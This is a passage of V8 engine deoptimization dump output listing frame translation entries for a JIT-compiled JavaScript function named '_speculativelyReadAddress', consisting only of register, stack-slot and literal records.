                               INT32_STACK_SLOT {input=21}
                               REGISTER {input=rsi}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rcx}
    46              172    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=172, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=22 (bool)}
                               INT32_REGISTER {input=r11}
                               DOUBLE_STACK_SLOT {input=25}
                               REGISTER {input=rax}
                               INT32_STACK_SLOT {input=21}
                               REGISTER {input=rsi}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rcx}
    47              172    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=172, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=22 (bool)}
                               INT32_REGISTER {input=r11}
                               DOUBLE_STACK_SLOT {input=25}
                               REGISTER {input=rax}
                               INT32_STACK_SLOT {input=21}
                               REGISTER {input=rsi}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rcx}
    48              172    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=172, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=22 (bool)}
                               INT32_REGISTER {input=r11}
                               DOUBLE_STACK_SLOT {input=25}
                               REGISTER {input=rax}
                               INT32_STACK_SLOT {input=21}
                               REGISTER {input=rsi}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rcx}
    49              172    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=172, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=22 (bool)}
                               INT32_REGISTER {input=r11}
                               DOUBLE_STACK_SLOT {input=25}
                               REGISTER {input=rax}
                               INT32_STACK_SLOT {input=21}
                               REGISTER {input=rsi}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rcx}
    50              172    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=172, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=22 (bool)}
                               INT32_REGISTER {input=r11}
                               DOUBLE_STACK_SLOT {input=25}
                               REGISTER {input=rax}
                               INT32_STACK_SLOT {input=21}
                               REGISTER {input=rsi}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rcx}
    51              243    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=243, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rax}
                               INT32_STACK_SLOT {input=21}
                               REGISTER {input=rsi}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rdx}
    52              243    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=243, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rax}
                               INT32_STACK_SLOT {input=21}
                               REGISTER {input=rsi}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rdx}
    53              243    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=243, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rax}
                               INT32_STACK_SLOT {input=21}
                               REGISTER {input=rsi}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rdx}
    54              270    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=270, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=18}
    55               13   920  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=13, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
    56                8    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=8, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=19}
    57               55   983  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=55, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=8 (0)}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
    58               50    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=50, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=8 (0)}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=19}
    59              132    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=132, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_REGISTER {input=rdx (bool)}
                               INT32_REGISTER {input=rdi}
                               DOUBLE_REGISTER {input=xmm0}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=8 (0)}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
    60              172    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=172, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_REGISTER {input=rdx (bool)}
                               INT32_REGISTER {input=rdi}
                               DOUBLE_REGISTER {input=xmm0}
                               REGISTER {input=rax}
                               LITERAL {literal_id=8 (0)}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
    61               55   a50  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=55, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=21}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
    62               50    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=50, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=21}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=19}
    63               50    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=50, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=21}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=19}
    64              132    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=132, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_REGISTER {input=rdx (bool)}
                               INT32_REGISTER {input=r12}
                               DOUBLE_REGISTER {input=xmm0}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=21}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
    65              172    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=172, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_REGISTER {input=rdx (bool)}
                               INT32_REGISTER {input=r12}
                               DOUBLE_REGISTER {input=xmm0}
                               REGISTER {input=rax}
                               INT32_STACK_SLOT {input=21}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rcx}
    66              241   c00  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=241, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=19}
                               INT32_STACK_SLOT {input=21}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=22}
    67              199   dae  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=199, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               INT32_STACK_SLOT {input=19}
                               BOOL_STACK_SLOT {input=21 (bool)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               DOUBLE_STACK_SLOT {input=22}
                               STACK_SLOT {input=23}
                               INT32_STACK_SLOT {input=24}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=25}
    68              186   e11  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=186, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=19 (bool)}
                               INT32_STACK_SLOT {input=21}
                               DOUBLE_STACK_SLOT {input=22}
                               STACK_SLOT {input=23}
                               INT32_STACK_SLOT {input=24}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=25}
    69              170   e76  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=170, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=19 (bool)}
                               INT32_STACK_SLOT {input=21}
                               DOUBLE_STACK_SLOT {input=22}
                               STACK_SLOT {input=23}
                               INT32_STACK_SLOT {input=24}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=25}
    70              143   ebe  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=143, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=19 (bool)}
                               INT32_STACK_SLOT {input=21}
                               DOUBLE_STACK_SLOT {input=22}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=23}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=4 (0x2aec586127e9 <JSFunction Uint8Array (sfi = 0x247b86a94b01)>)}
                               LITERAL {literal_id=7 (1)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=24}
    71              103   f0e  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=103, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=19 (bool)}
                               INT32_STACK_SLOT {input=21}
                               DOUBLE_STACK_SLOT {input=22}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=23}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=24}
    72               90   f51  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=90, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=19 (bool)}
                               INT32_STACK_SLOT {input=21}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=22}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=23}
    73               75   f8f  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=75, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
